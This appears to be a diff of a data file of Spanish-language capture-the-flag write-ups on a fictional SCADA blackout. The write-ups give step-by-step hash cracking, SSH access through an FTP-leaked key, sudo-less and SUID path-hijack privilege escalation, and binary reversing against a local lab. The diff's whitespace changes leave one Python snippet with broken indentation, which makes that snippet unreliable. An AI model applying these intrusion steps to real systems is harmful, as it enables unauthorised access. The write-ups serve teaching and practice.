-  {id:"mascara-latam",title:"Máscara LATAM",category:"Cripto",points:400,slug:"mascara-latam",files:["boveda.zip", "hash_maestra.sha256", "pista_ingeniero.txt"],content:`# Máscara LATAM
+ {id:"mascara-latam",title:"Máscara LATAM",category:"Cripto",points:400,slug:"mascara-latam",files:["boveda.zip", "hash_maestra.sha256", "pista_ingeniero.txt"],content:`# Máscara LATAM
 
 > Clave maestra del temporizador SCADA documentada solo como SHA256. La misma clave protege \`boveda.zip\`. Recupera \`WHOAMI{...}\`.
 >
@@ -1282,14 +1280,10 @@ $ unzip -o -P LATAM1414 boveda.zip
 extracting: flag.txt
 $ cat flag.txt
 WHOAMI{m4sk_r3gl4s_s3ct0r14}
-\`\`\`
-
-*"mask reglas sector14"* — el ataque por máscara según las reglas del sector 14.
-
-## Lección
+\`\`\` ## Lección
 
 Ante un SHA256 sin salt, no hay que invertirlo matemáticamente: se adivina. Si hay una pista de formato (prefijo + dígitos), un ataque por máscara (\`hashcat -m 1400 -a 3\`) con la forma exacta resuelve en segundos.`},
-  {id:"nodo-del-patio-norte",title:"Nodo del patio Norte",category:"Pentesting",points:125,slug:"nodo-del-patio-norte",files:["startlab.sh", "blackout-pt01.tar"],content:`# Nodo del patio Norte
+ {id:"nodo-del-patio-norte",title:"Nodo del patio Norte",category:"Pentesting",points:125,slug:"nodo-del-patio-norte",files:["startlab.sh", "blackout-pt01.tar"],content:`# Nodo del patio Norte
 
 > LATAM Energía Red dejó el nodo del patio Norte en modo recuperación. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
 >
@@ -1323,10 +1317,10 @@ $ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end
 
 \`\`\`bash
 $ nmap -sV -p- 172.17.0.2
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 9.2p1 Debian
-80/tcp open  http    Apache httpd 2.4.68 (Debian)
+PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 3.0.3
+22/tcp open ssh OpenSSH 9.2p1 Debian
+80/tcp open http Apache httpd 2.4.68 (Debian)
 \`\`\`
 
 **Lo que vi:** tres servicios — FTP, SSH y HTTP. Como es pentesting, la cadena probablemente mezcla varios.
@@ -1337,8 +1331,8 @@ PORT   STATE SERVICE VERSION
 
 \`\`\`bash
 $ curl -s "ftp://172.17.0.2/" --user "anonymous:"
-drwxr-xr-x  avisos
-drwxr-xr-x  respaldo
+drwxr-xr-x avisos
+drwxr-xr-x respaldo
 \`\`\`
 
 **Lo que vi:** hay una carpeta \`respaldo/norte\` con una **llave privada OpenSSH** (\`llave_patio\`) y un archivo \`turno_asignado.txt\` que dice "Titular: operador.norte". Decisión: esa llave debe servir para entrar por SSH.
@@ -1367,7 +1361,7 @@ uid=1000(operador.norte) gid=1000(operador.norte)
 \`\`\`bash
 $ ssh -i llave_patio operador.norte@172.17.0.2 "sudo -l"
 User operador.norte may run the following commands:
-    (root) NOPASSWD: /usr/bin/less
+ (root) NOPASSWD: /usr/bin/less
 \`\`\`
 
 **Lo que vi:** puedo ejecutar **\`/usr/bin/less\` como root sin contraseña**. \`less\` permite lanzar comandos desde su prompt con \`!\` (GTFOBins): con eso consigo un shell root.
@@ -1409,7 +1403,7 @@ WHOAMI{ftp_p4t10_n0rt3}
 ## Lección
 
 En pentesting no hay que asumir un único servicio: el nmap completo (\`-p-\`) destapa la cadena completa. Aquí FTP anónimo filtró una llave SSH, y el sudo sin contraseña sobre \`less\` (GTFOBins) dio root con \`!\`. Y ojo con los honeypots: una flag en \`/root/flag.txt\` accesible por \`docker exec\` puede ser un señuelo, la real está en la vía de ataque pensada para el reto.`},
-  {id:"pin-operador",title:"PIN del operador",category:"Cripto",points:125,slug:"pin-operador",files:["pin_operador.hash", "leeme.txt", "nota_recuperacion.zip"],content:`# PIN del operador
+ {id:"pin-operador",title:"PIN del operador",category:"Cripto",points:125,slug:"pin-operador",files:["pin_operador.hash", "leeme.txt", "nota_recuperacion.zip"],content:`# PIN del operador
 
 > Hash MD5 del PIN del panel local de la subestación Norte y un ZIP cifrado con esa misma clave. Recupera \`WHOAMI{...}\`.
 >
@@ -1470,7 +1464,7 @@ El tamaño y el formato apuntan a **MD5** (los demás son candidatos por coincid
 
 \`\`\`bash
 $ unzip -t nota_recuperacion.zip
-   skipping: flag.txt    unable to get password
+ skipping: flag.txt unable to get password
 \`\`\`
 
 Confirma que el ZIP está cifrado y que la clave es la que buscamos.
@@ -1484,7 +1478,7 @@ Confirma que el ZIP está cifrado y que la clave es la que buscamos.
 \`\`\`bash
 $ echo "14a4d10c5f5e2cc97fdaf07b06ed3771" > pin.hash
 $ john --format=raw-md5 --incremental pin.hash
-sector14         (?)
+sector14 (?)
 \`\`\`
 
 **Lo que vi:** john recuperó el valor **\`sector14\`** en segundos. No era un PIN numérico, sino una palabra ligada al contexto del reto (el sector 14), por eso una fuerza bruta numérica no lo hubiera encontrado.
@@ -1495,7 +1489,7 @@ sector14         (?)
 
 \`\`\`bash
 $ python3 -c "import hashlib; print(hashlib.md5(b'sector14').hexdigest())"
-14a4d10c5f5e2cc97fdaf07b06ed3771   # coincide
+14a4d10c5f5e2cc97fdaf07b06ed3771 # coincide
 
 $ unzip -P sector14 nota_recuperacion.zip
 extracting: flag.txt
@@ -1513,7 +1507,7 @@ WHOAMI{md5_p1n_0p3r4d0r}
 ## Lección
 
 Un PIN corto y predecible (como \`sector14\`) se recupera en segundos de su hash MD5 sin sal mediante fuerza bruta incremental, por lo que nunca debe usarse para cifrar datos sensibles.`},
-  {id:"radio-de-campo",title:"Radio de campo",category:"Pentesting",points:400,slug:"radio-de-campo",files:["startlab.sh", "blackout-pt03.tar"],content:`# Radio de campo
+ {id:"radio-de-campo",title:"Radio de campo",category:"Pentesting",points:400,slug:"radio-de-campo",files:["startlab.sh", "blackout-pt03.tar"],content:`# Radio de campo
 
 > Nodo de radio de campo del sector 14. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
 >
@@ -1540,16 +1534,16 @@ El consejo es la clave del reto: un escaneo solo TCP se pierde el **servicio de 
 
 \`\`\`bash
 $ nmap -sT -T4 --top-ports 1000 172.17.0.2
-PORT     STATE SERVICE
-21/tcp   open  ftp
-22/tcp   open  ssh
-23/tcp   open  telnet
-80/tcp   open  http
-199/tcp  open  smux
-8080/tcp open  http-proxy
+PORT STATE SERVICE
+21/tcp open ftp
+22/tcp open ssh
+23/tcp open telnet
+80/tcp open http
+199/tcp open smux
+8080/tcp open http-proxy
 
 $ nmap -sU -T4 --top-ports 100 172.17.0.2
-161/udp   open  snmp     ← el servicio de gestión
+161/udp open snmp ← el servicio de gestión
 \`\`\`
 
 **Lo que vi:** en TCP hay FTP/SSH/Telnet/HTTP/SMUX/8080, pero en **UDP está SNMP (161)** — el servicio de gestión que el reto menciona. Decisión: enumerar SNMP.
@@ -1575,7 +1569,7 @@ El usuario SSH \`sofia.radio\` tiene un hash \`$6$\` (sha512crypt) en \`/etc/sha
 
 \`\`\`bash
 $ john --format=sha512crypt --wordlist=/tmp/rf_wl.txt sofia.hash
-EnlaceRF14       (sofia.radio)
+EnlaceRF14 (sofia.radio)
 \`\`\`
 
 La contraseña es **\`EnlaceRF14\`** (la misma del \`sysLocation\`).
@@ -1595,7 +1589,7 @@ uid=1000(sofia.radio) gid=1000(sofia.radio)
 
 \`\`\`bash
 $ find / -perm -4000 2>/dev/null
-/usr/local/sbin/rf_sync   ← SUID root
+/usr/local/sbin/rf_sync ← SUID root
 \`\`\`
 
 **Lo que vi:** \`/usr/local/sbin/rf_sync\` es **SUID root**. Lo desensamblo con \`objdump\` para ver qué hace:
@@ -1604,7 +1598,7 @@ $ find / -perm -4000 2>/dev/null
 $ objdump -d -M intel rf_sync | sed -n '/<main>:/,/^$/p'
 call setuid(0)
 call setgid(0)
-lea  rax,[rip+0xe76]        # 2004 <_IO_stdin_used+0x4>  → "sync_rf"
+lea rax,[rip+0xe76] # 2004 <_IO_stdin_used+0x4> → "sync_rf"
 call system
 \`\`\`
 
@@ -1637,7 +1631,7 @@ WHOAMI{rad10_camp0_n14}
 ## Lección
 
 Dos puntos clave: (1) un escaneo solo TCP se pierde SNMP y demás servicios UDP — siempre escanea UDP en pentesting; y (2) un binario SUID que llama \`system()\` con un comando por nombre sin ruta absoluta es vulnerable a **path hijacking**: si el atacante controla el \`PATH\`, un ejecutable malicioso del mismo nombre se ejecuta como root.`},
-  {id:"rele-scada",title:"Relé SCADA",category:"Binarios",points:125,slug:"rele-scada",files:["scada_relay"],content:`# Relé SCADA
+ {id:"rele-scada",title:"Relé SCADA",category:"Binarios",points:125,slug:"rele-scada",files:["scada_relay"],content:`# Relé SCADA
 
 > Firmware del relé SCADA SN-441 (ELF Linux x64). Recupera el token \`WHOAMI{...}\`.
 >
@@ -1692,7 +1686,7 @@ La clave está en un símbolo elocuente: \`TOKEN_B64\`. **Lo que vi:** el nombre
 
 \`\`\`bash
 $ rabin2 -z scada_relay | grep TOKEN_B64
-0x0047eb80  .rodata   ascii   V0hPQU1Je3N0cjFuZ3NfNG5kX2I2NH0=
+0x0047eb80 .rodata ascii V0hPQU1Je3N0cjFuZ3NfNG5kX2I2NH0=
 \`\`\`
 
 ### 4. Decodificar el base64
@@ -1712,7 +1706,7 @@ $ echo "WHOAMI{str1ngs_4nd_b64}" | ./scada_relay
 ## Lección
 
 Antes de abrir un decompilador, pasa siempre \`strings\` por el binario y busca nombres de variables/constantes reveladores (como \`TOKEN_B64\`): muchos retos de categoría "binarios" son solo un texto en base64/hex escondido en \`.rodata\`.`},
-  {id:"shadow-del-turno",title:"Shadow del turno",category:"Cripto",points:300,slug:"shadow-del-turno",files:["shadow_turno.txt", "export_consola.txt", "consola.zip"],content:`# Shadow del turno
+ {id:"shadow-del-turno",title:"Shadow del turno",category:"Cripto",points:300,slug:"shadow-del-turno",files:["shadow_turno.txt", "export_consola.txt", "consola.zip"],content:`# Shadow del turno
 
 > Backup parcial de /etc/shadow del servidor de consola. El password de operador.turno también abre el ZIP. Recupera \`WHOAMI{...}\`.
 >
@@ -1756,7 +1750,7 @@ El hash empieza por **\`$6$\`**, que es la firma de **sha512crypt** (el algoritm
 \`\`\`bash
 $ printf 'operador.turno:$6$blackoutlatam$j7D9JpButrtJLmv3QEEqQ4fNiuoCX2tLCMwPrAjBcJUhquW.2vMJvLr/uSjHTAQ6zf/F1JXlfjIGpgmr8FJkS/\\n' > shadow.hash
 $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.hash
-electric         (operador.turno)
+electric (operador.turno)
 \`\`\`
 
 **Lo que vi:** john recuperó la contraseña **\`electric\`** en menos de un segundo usando el diccionario rockyou.
@@ -1784,7 +1778,7 @@ WHOAMI{sh4d0w_turn0_n0rt3}
 ## Lección
 
 Un hash \`$6$\` (sha512crypt) de \`/etc/shadow\` no se puede invertir matemáticamente: se adivina. Con una contraseña débil en un diccionario, \`john --format=sha512crypt\` la recupera al instante, y esa misma clave suele reutilizarse para desbloquear otros archivos del reto.`},
-  {id:"telemetria-xor",title:"Telemetría XOR",category:"Binarios",points:300,slug:"telemetria-xor",files:["telemetry_decode"],content:`# Telemetría XOR
+ {id:"telemetria-xor",title:"Telemetría XOR",category:"Binarios",points:300,slug:"telemetria-xor",files:["telemetry_decode"],content:`# Telemetría XOR
 
 > Utilitario \`telemetry_decode\` (ELF Linux x64). Imprime payload en hex; recupera \`WHOAMI{...}\`.
 >
@@ -1833,7 +1827,7 @@ WHOAMI{x0r_t3l3m3tr14}
 ## Lección
 
 Cuando un binario imprima metadatos con \`cipher=xor\` y \`key=...\`, ejecútalo antes de desensamblar: a veces la solución está en la propia salida. XOR por byte con la clave en ciclo (\`. \` i % len(key)\`) decodifica el payload.`},
-  {id:"trafico-de-control",title:"Tráfico de control",category:"Forense",points:125,slug:"trafico-de-control",files:["blackout_control.pcap"],content:`# Tráfico de control
+ {id:"trafico-de-control",title:"Tráfico de control",category:"Forense",points:125,slug:"trafico-de-control",files:["blackout_control.pcap"],content:`# Tráfico de control
 
 > PCAP parcial del portal SCADA durante el apagón. El operador autenticó en claro; recupera \`WHOAMI{...}\`.
 >
@@ -1853,11 +1847,11 @@ La pista apunta al tráfico HTTP en el puerto 80. El PCAP es muy corto: una cone
 
 \`\`\`bash
 $ tshark -r blackout_control.pcap
-    1   0.000000   10.14.0.21 → 10.14.0.5   TCP 40 44102 → 80 [SYN]
-    2   0.000854   10.14.0.5 → 10.14.0.21   TCP 40 80 → 44102 [SYN, ACK]
-    3   0.001432   10.14.0.21 → 10.14.0.5   TCP 40 44102 → 80 [ACK]
-    4   0.002804   10.14.0.21 → 10.14.0.5   HTTP 285 POST /scada/auth HTTP/1.1
-    5   0.003634   10.14.0.5 → 10.14.0.21   TCP 40 80 → 44102 [ACK]
+ 1 0.000000 10.14.0.21 → 10.14.0.5 TCP 40 44102 → 80 [SYN]
+ 2 0.000854 10.14.0.5 → 10.14.0.21 TCP 40 80 → 44102 [SYN, ACK]
+ 3 0.001432 10.14.0.21 → 10.14.0.5 TCP 40 44102 → 80 [ACK]
+ 4 0.002804 10.14.0.21 → 10.14.0.5 HTTP 285 POST /scada/auth HTTP/1.1
+ 5 0.003634 10.14.0.5 → 10.14.0.21 TCP 40 80 → 44102 [ACK]
 \`\`\`
 
 **Lo que vi:** un único POST \`POST /scada/auth\` hacia el puerto 80 → es una autenticación; ahí debe estar el dato.
@@ -1879,7 +1873,7 @@ El cuerpo viaja en hexadecimal (form-urlencoded). Se decodifica a texto:
 
 \`\`\`bash
 $ tshark -r blackout_control.pcap -Y "http" -T fields -e http.file_data | \\
-    python3 -c "import sys; print(bytes.fromhex(sys.stdin.read().strip()).decode())"
+ python3 -c "import sys; print(bytes.fromhex(sys.stdin.read().strip()).decode())"
 user=operador.turno&pass=RedLatam2026!&nota_recuperacion=WHOAMI{http_pl41nt3xt_4p4g0n}&sector=14
 \`\`\`
 
@@ -1888,7 +1882,7 @@ La flag está en \`nota_recuperacion\`. "HTTP en claro (plaintext) = apagón", c
 ## Lección
 
 En un PCAP siempre filtra por protocolo (\`http\`) y mira los cuerpos de los POST — la autenticación en claro deja datos sensibles (y flags) a la vista. Para decodificar form-urlencoded, extrae \`http.file_data\` y revierte el hexadecimal.`},
-  {id:"validador-de-turno",title:"Validador de turno",category:"Binarios",points:400,slug:"validador-de-turno",files:["turno_guard"],content:`# Validador de turno
+ {id:"validador-de-turno",title:"Validador de turno",category:"Binarios",points:400,slug:"validador-de-turno",files:["turno_guard"],content:`# Validador de turno
 
 > Validador \`turno_guard\` (ELF Linux x64). Solo acepta un token exacto \`WHOAMI{...}\`.
 >
@@ -1923,27 +1917,27 @@ $ objdump -d -M intel turno_guard | sed -n '/<main>:/,/^$/p'
 ### 2. Entender la validación
 
 \`\`\`asm
-cmp rax, 0x17          ; el token debe tener 23 caracteres
-lea rcx, [rip+...]     ; 47eb10 <MASKED>  (cadena esperada, ofuscada)
-mov edx, 0x7           ; clave inicial
+cmp rax, 0x17 ; el token debe tener 23 caracteres
+lea rcx, [rip+...] ; 47eb10 <MASKED> (cadena esperada, ofuscada)
+mov edx, 0x7 ; clave inicial
 loop:
-  movzx esi, BYTE PTR [rax]   ; char del input
-  xor   esi, edx              ; char ^ clave
-  cmp   sil, BYTE PTR [rcx]   ; compara con MASKED[i]
-  je    next
-  ...
+ movzx esi, BYTE PTR [rax] ; char del input
+ xor esi, edx ; char ^ clave
+ cmp sil, BYTE PTR [rcx] ; compara con MASKED[i]
+ je next
+ ...
 next:
-  add edx, 0xd         ; clave += 13 por cada char
-  add rax, 0x1
-  add rcx, 0x1
-  cmp dl, 0x32         ; 7 + 13*23 = 306 ≡ 50 (0x32) al final
-  je   [OK]
+ add edx, 0xd ; clave += 13 por cada char
+ add rax, 0x1
+ add rcx, 0x1
+ cmp dl, 0x32 ; 7 + 13*23 = 306 ≡ 50 (0x32) al final
+ je [OK]
 \`\`\`
 
 La lógica: cada carácter del token se compara con \`MASKED[i]\` **después de XORearlo con una clave progresiva** que empieza en 7 y suma 13 por posición:
 
 \`\`\`
-input[i] ^ (7 + 13*i) == MASKED[i]      →   input[i] = MASKED[i] ^ (7 + 13*i)
+input[i] ^ (7 + 13*i) == MASKED[i] → input[i] = MASKED[i] ^ (7 + 13*i)
 \`\`\`
 
 ### 3. Extraer MASKED y deshacer el XOR
@@ -1956,8 +1950,8 @@ input[i] ^ (7 + 13*i) == MASKED[i]      →   input[i] = MASKED[i] ^ (7 + 13*i)
 
 \`\`\`bash
 $ objdump -s -j .rodata turno_guard
- 47eb10  505c6e6f 76012e09 5c05eea5 cdefdfa6  P\\nov...\\.......
- 47eb20  e3879ace 7e6c5800 ...
+ 47eb10 505c6e6f 76012e09 5c05eea5 cdefdfa6 P\\nov...\\.......
+ 47eb20 e3879ace 7e6c5800 ...
 \`\`\`
 
 **Herramienta:** \`python3\`. **Por qué:** aplicar la operación inversa \`MASKED[i] ^ (7 + 13*i)\` byte a byte.
@@ -1965,7 +1959,7 @@ $ objdump -s -j .rodata turno_guard
 \`\`\`python
 masked = bytes.fromhex('505c6e6f76012e095c05eea5cdefdfa6e3879ace7e6c58')
 flag = ''.join(chr(m ^ ((7 + 0xd*i) & 0xff)) for i, m in enumerate(masked))
-print(flag)   # WHOAMI{k3yg3n_bl4ck0ut}
+print(flag) # WHOAMI{k3yg3n_bl4ck0ut}
 \`\`\`
 
 ### 4. Confirmar
@@ -1978,7 +1972,7 @@ $ echo "WHOAMI{k3yg3n_bl4ck0ut}" | ./turno_guard
 ## Lección
 
 Un comparador con "clave progresiva" (XOR con contador) se revierte fácil: reconstruye la secuencia de claves (\`7, 20, 33, 46, …\`) y aplica \`masked[i] ^ key[i]\`. El valor final del contador (\`0x32\`) también delata la longitud exacta del token.`},
-  {id:"vm-plc",title:"VM PLC",category:"Binarios",points:500,slug:"vm-plc",files:["plc_ladder"],content:`# VM PLC
+ {id:"vm-plc",title:"VM PLC",category:"Binarios",points:500,slug:"vm-plc",files:["plc_ladder"],content:`# VM PLC
 
 > Mini-VM ladder en \`plc_ladder\` (ELF Linux x64). Recupera la clave maestra \`WHOAMI{...}\`.
 >
@@ -2017,15 +2011,15 @@ $ objdump -d -M intel plc_ladder | sed -n '/401720 <main>:/,/^$/p'
 El corazón del bucle (dispatching):
 
 \`\`\`asm
-lea  rax,[rip+0x7d3b4]        # 47eb40 <PROG>      ; el "programa ladder"
-lea  rcx,[rip+0x7d381]        # 47eb20             ; jump table
+lea rax,[rip+0x7d3b4] # 47eb40 <PROG> ; el "programa ladder"
+lea rcx,[rip+0x7d381] # 47eb20 ; jump table
 ...
-movzx esi,BYTE PTR [rax+0x1]  ; operando (byte 2)
-cmp  BYTE PTR [rax],0x4       ; opcode (byte 1) <= 4
+movzx esi,BYTE PTR [rax+0x1] ; operando (byte 2)
+cmp BYTE PTR [rax],0x4 ; opcode (byte 1) <= 4
 ...
 movsxd rdx,DWORD PTR [rcx+rdx*4]
-add  rdx,rcx
-jmp  rdx                      ; salto calculado -> interpreta el opcode
+add rdx,rcx
+jmp rdx ; salto calculado -> interpreta el opcode
 \`\`\`
 
 Cada instrucción es de **2 bytes** (\`opcode\`, \`operando\`) y el programa \`PROG\` termina con el opcode 4. Con la jump table en la mano:
@@ -2063,12 +2057,12 @@ $ python3 -c "
 prog=bytes.fromhex('00000107025000000114025c...02580400')
 i=0; flag=''
 while i < len(prog)-1:
-    if prog[i]==0:                    # load char
-        key, expected = prog[i+3], prog[i+5]
-        flag += chr(expected ^ key)
-        i += 6
-    elif prog[i]==4: break            # fin de programa
-    else: i += 2
+ if prog[i]==0: # load char
+ key, expected = prog[i+3], prog[i+5]
+ flag += chr(expected ^ key)
+ i += 6
+ elif prog[i]==4: break # fin de programa
+ else: i += 2
 print(flag)"
 WHOAMI{vm_plc_s3ctor14}
 \`\`\`
